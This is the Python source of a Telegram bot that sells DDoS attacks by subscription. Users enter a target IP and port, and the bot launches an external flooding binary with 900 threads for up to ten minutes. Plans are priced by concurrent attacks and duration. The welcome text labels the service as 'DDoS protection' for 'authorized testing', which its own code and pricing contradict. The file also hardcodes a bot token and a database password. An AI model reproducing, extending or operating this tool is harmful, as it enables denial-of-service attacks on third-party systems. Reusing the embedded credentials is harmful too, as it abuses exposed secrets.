import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

# Constants
TOKEN = '7713354946:AAFdS8AbgRyPgL8d_5utsURl2rMl1Y2lZro'
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
GROUP_ID = -1002592414270  # Your group ID
ADMIN_IDS = [8167507955]  # Your admin ID
OWNER_NAME = "Seedhe Maut"
OWNER_USERNAME = "@seedhe_maut_bot"
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
MAX_ATTACK_DURATION = 600  # 10 minutes
THREADS_COUNT = 900

# Initialize MongoDB
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users
groups_collection = db.groups

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Global variables
user_attack_details = {}
active_attacks = {}

def should_respond(chat_id, user_id):
    """Check if bot should respond in this chat"""
    # Always respond to admins in private chats
    if chat_id > 0 and user_id in ADMIN_IDS:
        return True
    # Only respond in group if message is from admin
    if chat_id == GROUP_ID and user_id in ADMIN_IDS:
        return True
    # Respond in private chats to all users
    if chat_id > 0:
        return True
    return False

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def is_group_admin(chat_id, user_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get('plan', 0) > 0:
            valid_until = user_data.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error checking user approval: {e}")
        return False

def get_user_plan(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        return user_data.get('plan', 0) if user_data else 0
    except Exception as e:
        logging.error(f"Error getting user plan: {e}")
        return 0

def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:  # Start attack
            process = subprocess.Popen(
                ["./maut", target_ip, str(target_port), str(MAX_ATTACK_DURATION), str(THREADS_COUNT)],
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            active_attacks[(user_id, target_ip, target_port)] = process.pid
            logging.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
            return True
        elif action == 2:  # Stop attack
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
                logging.info(f"Stopped attack with PID {pid}")
                return True
        return False
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        return False

def create_main_menu():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("🚀 Start Attack"),
        KeyboardButton("⏹ Stop Attack"),
        KeyboardButton("ℹ️ Help"),
        KeyboardButton("📊 My Plan")
    )
    return markup

def create_admin_menu():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("👥 User Management"),
        KeyboardButton("👥 Group Settings"),
        KeyboardButton("📊 Stats"),
        KeyboardButton("🔙 Main Menu")
    )
    return markup

def create_group_settings_menu():
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🛡 Set Welcome Message", callback_data="set_welcome"),
        InlineKeyboardButton("🚫 Set Rules", callback_data="set_rules"),
        InlineKeyboardButton("🔒 Lock Group", callback_data="lock_group"),
        InlineKeyboardButton("🔓 Unlock Group", callback_data="unlock_group")
    )
    return markup

def send_welcome_message(chat_id, user_id=None):
    if chat_id == GROUP_ID:
        # Get group welcome message from DB
        group_data = groups_collection.find_one({"group_id": GROUP_ID})
        welcome_msg = group_data.get('welcome_message', f"""
🌟 Welcome to {OWNER_NAME}'s Group! 🌟

🔹 Follow the rules
🔹 Be respectful
🔹 No spam

Enjoy your stay!
""")
        
        if user_id:
            try:
                user = bot.get_chat_member(chat_id, user_id).user
                welcome_msg = welcome_msg.replace("{name}", user.first_name)
                welcome_msg = welcome_msg.replace("{username}", f"@{user.username}" if user.username else user.first_name)
            except:
                pass
            
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📜 Rules", callback_data="show_rules"))
        bot.send_message(chat_id, welcome_msg, reply_markup=markup)
    else:
        welcome_msg = f"""
🌟 *Welcome to {OWNER_NAME}'s DDoS Protection Bot* 🌟

🔹 *Owner:* {OWNER_NAME} ({OWNER_USERNAME})
🔹 *Features:* 
   - Powerful Layer4 DDoS protection
   - Easy-to-use interface
   - Multiple plan options

📌 *Note:* This bot is for authorized testing only. Misuse will result in ban.

Use /help to see available commands.
"""
        bot.send_message(chat_id, welcome_msg, parse_mode='Markdown', reply_markup=create_main_menu())

def send_help_message(chat_id):
    help_msg = f"""
🆘 *Help Center* 🆘

*Available Commands:*
/start - Show main menu
/help - Show this help message
/attack - Start a new attack
/mystats - Show your usage statistics
/buy - Get information about plans

*Group Commands:*
/rules - Show group rules
/warn <user> - Warn a user
/ban <user> - Ban a user
/unban <user> - Unban a user
/kick <user> - Kick a user

*Admin Commands* (Admin only):
/approve <user_id> <plan> <days> - Approve user
/disapprove <user_id> - Remove user approval
/stats - Show bot statistics

📌 *Contact {OWNER_USERNAME} for purchase or support*
"""
    bot.send_message(chat_id, help_msg, parse_mode='Markdown')

def send_plan_info(chat_id, user_id):
    plan = get_user_plan(user_id)
    if plan == 0:
        plan_msg = """
📊 *Your Plan: FREE*

🔹 *Limitations:*
- Limited attack duration
- Lower priority
- No support

💎 *Upgrade your plan for full features!*
"""
    else:
        user_data = users_collection.find_one({"user_id": user_id})
        valid_until = user_data.get('valid_until', "Lifetime")
        plan_msg = f"""
📊 *Your Plan: PREMIUM (Level {plan})*

🔹 *Benefits:*
- Full attack duration
- Highest priority
- Premium support

⏳ *Valid Until:* {valid_until}

Thank you for being a premium user!
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 Upgrade Plan", url=f"tg://user?id={ADMIN_IDS[0]}"))
    bot.send_message(chat_id, plan_msg, parse_mode='Markdown', reply_markup=markup)

# Message handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    if is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "👑 *Admin Panel* 👑", 
                        parse_mode='Markdown', reply_markup=create_admin_menu())
    else:
        send_welcome_message(message.chat.id)

@bot.message_handler(commands=['help'])
def help_command(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
    send_help_message(message.chat.id)

@bot.message_handler(commands=['mystats'])
def mystats_command(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    stats_msg = f"""
📈 *Your Statistics*

🔸 *Plan Level:* {user_data.get('plan', 0)}
🔸 *Attacks Performed:* {user_data.get('attack_count', 0)}
🔸 *Last Attack:* {user_data.get('last_attack', 'Never')}
🔸 *Account Valid Until:* {user_data.get('valid_until', 'Not specified')}
"""
    bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')

@bot.message_handler(commands=['buy'])
def buy_command(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    plans_msg = f"""
💎 *Available Plans* 💎

1️⃣ *Basic Plan* ($10/month)
- 10 concurrent attacks
- 5 minute max duration
- Standard support

2️⃣ *Pro Plan* ($25/month)
- 25 concurrent attacks
- 10 minute max duration
- Priority support

3️⃣ *VIP Plan* ($50/month)
- Unlimited attacks
- 30 minute max duration
- 24/7 dedicated support

📌 *Custom plans available*

Contact {OWNER_USERNAME} to purchase or for more information.
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📩 Contact Owner", url=f"tg://user?id={ADMIN_IDS[0]}"))
    bot.send_message(message.chat.id, plans_msg, parse_mode='Markdown', reply_markup=markup)

# Group management commands
@bot.message_handler(commands=['rules'])
def rules_command(message):
    if message.chat.id != GROUP_ID:
        return
        
    group_data = groups_collection.find_one({"group_id": GROUP_ID})
    rules = group_data.get('rules', "No rules set yet. Please contact admin.")
    bot.send_message(message.chat.id, f"📜 *Group Rules:*\n\n{rules}", parse_mode='Markdown')

@bot.message_handler(commands=['warn'])
def warn_user(message):
    if message.chat.id != GROUP_ID or not is_group_admin(message.chat.id, message.from_user.id):
        return
        
    try:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            user = message.reply_to_message.from_user
        else:
            cmd_parts = message.text.split()
            if len(cmd_parts) < 2:
                bot.reply_to(message, "ℹ️ Usage: /warn @username or reply to a message")
                return
            user_id = cmd_parts[1].strip('@')
            try:
                user = bot.get_chat_member(message.chat.id, user_id).user
            except:
                bot.reply_to(message, "❌ User not found")
                return
        
        # Update warn count in DB
        users_collection.update_one(
            {"user_id": user_id, "group_id": GROUP_ID},
            {"$inc": {"warn_count": 1}},
            upsert=True
        )
        
        user_data = users_collection.find_one({"user_id": user_id, "group_id": GROUP_ID})
        warn_count = user_data.get('warn_count', 1)
        
        if warn_count >= 3:
            bot.ban_chat_member(message.chat.id, user_id)
            bot.reply_to(message, f"🚫 User {user.first_name} has been banned for reaching 3 warnings")
        else:
            bot.reply_to(message, f"⚠️ Warning {warn_count}/3 to {user.first_name}")
            
    except Exception as e:
        logging.error(f"Error in warn_user: {e}")
        bot.reply_to(message, "❌ An error occurred")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.chat.id != GROUP_ID or not is_group_admin(message.chat.id, message.from_user.id):
        return
        
    try:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            user = message.reply_to_message.from_user
        else:
            cmd_parts = message.text.split()
            if len(cmd_parts) < 2:
                bot.reply_to(message, "ℹ️ Usage: /ban @username or reply to a message")
                return
            user_id = cmd_parts[1].strip('@')
            try:
                user = bot.get_chat_member(message.chat.id, user_id).user
            except:
                bot.reply_to(message, "❌ User not found")
                return
        
        bot.ban_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"🚫 User {user.first_name} has been banned")
        
    except Exception as e:
        logging.error(f"Error in ban_user: {e}")
        bot.reply_to(message, "❌ An error occurred")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.chat.id != GROUP_ID or not is_group_admin(message.chat.id, message.from_user.id):
        return
        
    try:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            user = message.reply_to_message.from_user
        else:
            cmd_parts = message.text.split()
            if len(cmd_parts) < 2:
                bot.reply_to(message, "ℹ️ Usage: /unban @username or reply to a message")
                return
            user_id = cmd_parts[1].strip('@')
            try:
                user = bot.get_chat_member(message.chat.id, user_id).user
            except:
                bot.reply_to(message, "❌ User not found")
                return
        
        bot.unban_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"✅ User {user.first_name} has been unbanned")
        
    except Exception as e:
        logging.error(f"Error in unban_user: {e}")
        bot.reply_to(message, "❌ An error occurred")

@bot.message_handler(commands=['kick'])
def kick_user(message):
    if message.chat.id != GROUP_ID or not is_group_admin(message.chat.id, message.from_user.id):
        return
        
    try:
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            user = message.reply_to_message.from_user
        else:
            cmd_parts = message.text.split()
            if len(cmd_parts) < 2:
                bot.reply_to(message, "ℹ️ Usage: /kick @username or reply to a message")
                return
            user_id = cmd_parts[1].strip('@')
            try:
                user = bot.get_chat_member(message.chat.id, user_id).user
            except:
                bot.reply_to(message, "❌ User not found")
                return
        
        bot.ban_chat_member(message.chat.id, user_id)
        bot.unban_chat_member(message.chat.id, user_id)
        bot.reply_to(message, f"👢 User {user.first_name} has been kicked")
        
    except Exception as e:
        logging.error(f"Error in kick_user: {e}")
        bot.reply_to(message, "❌ An error occurred")

# Admin commands
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = min(max(int(cmd_parts[2]), 1), 3)  # Clamp between 1-3
        days = int(cmd_parts[3])

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else "Lifetime"
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {
                "plan": plan,
                "valid_until": valid_until,
                "approved_by": message.from_user.id,
                "approved_at": datetime.now().isoformat()
            }},
            upsert=True
        )
        
        response_msg = f"""
✅ *User Approved*
🔹 *ID:* `{target_user_id}`
🔹 *Plan:* {plan}
🔹 *Duration:* {days} days
🔹 *Valid Until:* {valid_until}
"""
        bot.send_message(message.chat.id, response_msg, parse_mode='Markdown')
        
        # Notify the user
        try:
            bot.send_message(target_user_id, f"""
🎉 *Your account has been approved!*

🔹 *Plan Level:* {plan}
🔹 *Valid Until:* {valid_until}

You can now use all bot features.
""", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Could not notify user {target_user_id}: {e}")

    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in approve_user: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {
                "plan": 0, 
                "valid_until": "", 
                "disapproved_at": datetime.now().isoformat(),
                "disapproved_by": message.from_user.id
            }}
        )
        bot.send_message(message.chat.id, f"❌ *User `{target_user_id}` has been disapproved*", parse_mode='Markdown')
        
        # Notify the user
        try:
            bot.send_message(target_user_id, """
⚠️ *Your account access has been revoked*

Your plan has been downgraded to Free. 
Contact admin for more information.
""", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Could not notify user {target_user_id}: {e}")

    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in disapprove_user: {e}")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
        return

    try:
        total_users = users_collection.count_documents({})
        premium_users = users_collection.count_documents({"plan": {"$gt": 0}})
        active_attacks_count = len(active_attacks)
        
        stats_msg = f"""
📊 *Bot Statistics*

👥 *Total Users:* {total_users}
💎 *Premium Users:* {premium_users}
⚡ *Active Attacks:* {active_attacks_count}
"""
        bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
    except Exception as e:
        error_msg = f"❌ *Error generating stats:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in stats_command: {e}")

# New member handler
@bot.message_handler(content_types=['new_chat_members'])
def handle_new_member(message):
    if message.chat.id == GROUP_ID:
        for user in message.new_chat_members:
            if user.is_bot and user.id != bot.get_me().id:
                bot.ban_chat_member(message.chat.id, user.id)
            else:
                send_welcome_message(message.chat.id, user.id)

# Button handlers
@bot.message_handler(func=lambda message: message.text in ["🚀 Start Attack", "/attack"])
def attack_button_handler(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        bot.send_message(message.chat.id, """
🔒 *Access Restricted*

You don't have permission to use this feature.
Please upgrade your plan or contact admin.
""", parse_mode='Markdown')
        return

    bot.send_message(message.chat.id, """
🎯 *Attack Setup*

Please provide the target in this format:
`IP PORT`

Example:
`1.1.1.1 80`
""", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        if not should_respond(message.chat.id, message.from_user.id):
            return
            
        user_id = message.from_user.id
        args = message.text.split()
        
        if len(args) != 2:
            bot.send_message(message.chat.id, "❌ *Invalid format!* Use: `IP PORT`", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        
        if target_port in BLOCKED_PORTS:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
            return

        user_attack_details[user_id] = (target_ip, target_port)
        
        # Confirm attack details
        confirm_msg = f"""
🔍 *Attack Details Confirmation*

🔹 *Target IP:* `{target_ip}`
🔹 *Target Port:* `{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`

⚠️ *Are you sure you want to proceed?*
"""
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack_{user_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        bot.send_message(message.chat.id, confirm_msg, parse_mode='Markdown', reply_markup=markup)

    except ValueError:
        bot.send_message(message.chat.id, "❌ *Invalid port number!*", parse_mode='Markdown')
    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in process_attack_ip_port: {e}")

@bot.message_handler(func=lambda message: message.text == "⏹ Stop Attack")
def stop_attack_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    user_id = message.from_user.id
    attack_details = user_attack_details.get(user_id)
    
    if not attack_details:
        bot.send_message(message.chat.id, "❌ *No active attack found*", parse_mode='Markdown')
        return
    
    target_ip, target_port = attack_details
    if run_attack_command_sync(user_id, target_ip, target_port, 2):
        bot.send_message(message.chat.id, f"""
🛑 *Attack Stopped*

🔹 *Target:* `{target_ip}:{target_port}`
✅ Successfully terminated
""", parse_mode='Markdown')
        user_attack_details.pop(user_id, None)
    else:
        bot.send_message(message.chat.id, "❌ *Failed to stop attack*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "ℹ️ Help")
def help_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
    send_help_message(message.chat.id)

@bot.message_handler(func=lambda message: message.text == "📊 My Plan")
def myplan_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
    send_plan_info(message.chat.id, message.from_user.id)

@bot.message_handler(func=lambda message: message.text == "👥 User Management" and is_user_admin(message.from_user.id))
def user_management_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📝 Approve User", callback_data="admin_approve"),
        InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove"),
        InlineKeyboardButton("📊 List Users", callback_data="admin_list_users")
    )
    bot.send_message(message.chat.id, "👥 *User Management*", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "👥 Group Settings" and is_user_admin(message.from_user.id))
def group_settings_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
        
    bot.send_message(message.chat.id, "⚙️ *Group Settings*", 
                    parse_mode='Markdown', reply_markup=create_group_settings_menu())

@bot.message_handler(func=lambda message: message.text == "📊 Stats" and is_user_admin(message.from_user.id))
def stats_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
    stats_command(message)

@bot.message_handler(func=lambda message: message.text == "🔙 Main Menu")
def main_menu_button(message):
    if not should_respond(message.chat.id, message.from_user.id):
        return
    send_welcome_message(message.chat.id)

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        if call.data.startswith("confirm_attack_"):
            user_id = int(call.data.split("_")[2])
            if call.from_user.id != user_id:
                bot.answer_callback_query(call.id, "❌ This is not your attack!", show_alert=True)
                return
                
            attack_details = user_attack_details.get(user_id)
            if not attack_details:
                bot.answer_callback_query(call.id, "❌ Attack details not found!", show_alert=True)
                return
                
            target_ip, target_port = attack_details
            if run_attack_command_sync(user_id, target_ip, target_port, 1):
                # Update user stats
                users_collection.update_one(
                    {"user_id": user_id},
                    {
                        "$inc": {"attack_count": 1},
                        "$set": {"last_attack": datetime.now().isoformat()}
                    },
                    upsert=True
                )
                
                bot.edit_message_text(
                    f"""
✅ *Attack Launched!*

🔹 *Target:* `{target_ip}:{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`

⚠️ *Attack will automatically stop after {MAX_ATTACK_DURATION//60} minutes*
""",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown'
                )
            else:
                bot.answer_callback_query(call.id, "❌ Failed to start attack!", show_alert=True)
                
        elif call.data == "cancel_attack":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.answer_callback_query(call.id, "Attack canceled")
            
        elif call.data == "admin_approve":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_disapprove":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_list_users":
            if is_user_admin(call.from_user.id):
                premium_users = list(users_collection.find({"plan": {"$gt": 0}}).limit(10))
                users_list = "\n".join([
                    f"🔹 `{u['user_id']}` - Plan {u['plan']} (Until {u.get('valid_until', '?')})"
                    for u in premium_users
                ])
                bot.send_message(
                    call.message.chat.id,
                    f"💎 *Premium Users*\n{users_list}\n\nTotal: {len(premium_users)}",
                    parse_mode='Markdown'
                )
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "set_welcome":
            if is_user_admin(call.from_user.id):
                msg = bot.send_message(call.message.chat.id, "📝 Please send the new welcome message. You can use:\n{name} - User's first name\n{username} - User's @username")
                bot.register_next_step_handler(msg, process_welcome_message)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "set_rules":
            if is_user_admin(call.from_user.id):
                msg = bot.send_message(call.message.chat.id, "📝 Please send the new group rules")
                bot.register_next_step_handler(msg, process_rules_message)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "lock_group":
            if is_user_admin(call.from_user.id):
                groups_collection.update_one(
                    {"group_id": GROUP_ID},
                    {"$set": {"locked": True}},
                    upsert=True
                )
                bot.answer_callback_query(call.id, "🔒 Group locked - Only admins can post now")
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "unlock_group":
            if is_user_admin(call.from_user.id):
                groups_collection.update_one(
                    {"group_id": GROUP_ID},
                    {"$set": {"locked": False}},
                    upsert=True
                )
                bot.answer_callback_query(call.id, "🔓 Group unlocked - Everyone can post now")
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "show_rules":
            group_data = groups_collection.find_one({"group_id": GROUP_ID})
            rules = group_data.get('rules', "No rules set yet. Please contact admin.")
            bot.answer_callback_query(call.id, f"📜 Group Rules:\n\n{rules}", show_alert=True)
                
    except Exception as e:
        logging.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ An error occurred", show_alert=True)

def process_welcome_message(message):
    try:
        if not is_user_admin(message.from_user.id):
            return
            
        welcome_msg = message.text
        groups_collection.update_one(
            {"group_id": GROUP_ID},
            {"$set": {"welcome_message": welcome_msg}},
            upsert=True
        )
        bot.reply_to(message, "✅ Welcome message updated!")
    except Exception as e:
        logging.error(f"Error in process_welcome_message: {e}")
        bot.reply_to(message, "❌ Failed to update welcome message")

def process_rules_message(message):
    try:
        if not is_user_admin(message.from_user.id):
            return
            
        rules = message.text
        groups_collection.update_one(
            {"group_id": GROUP_ID},
            {"$set": {"rules": rules}},
            upsert=True
        )
        bot.reply_to(message, "✅ Group rules updated!")
    except Exception as e:
        logging.error(f"Error in process_rules_message: {e}")
        bot.reply_to(message, "❌ Failed to update group rules")

# Start the bot
if __name__ == "__main__":
    logging.info("Starting bot...")
    try:
        # Initialize group settings if not exists
        if not groups_collection.find_one({"group_id": GROUP_ID}):
            groups_collection.insert_one({
                "group_id": GROUP_ID,
                "welcome_message": f"🌟 Welcome to {OWNER_NAME}'s Group! 🌟\n\n🔹 Follow the rules\n🔹 Be respectful\n🔹 No spam\n\nEnjoy your stay!",
                "rules": "1. No spam\n2. Be respectful\n3. Follow admin instructions",
                "locked": False
            })
            
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot crashed: {e}")
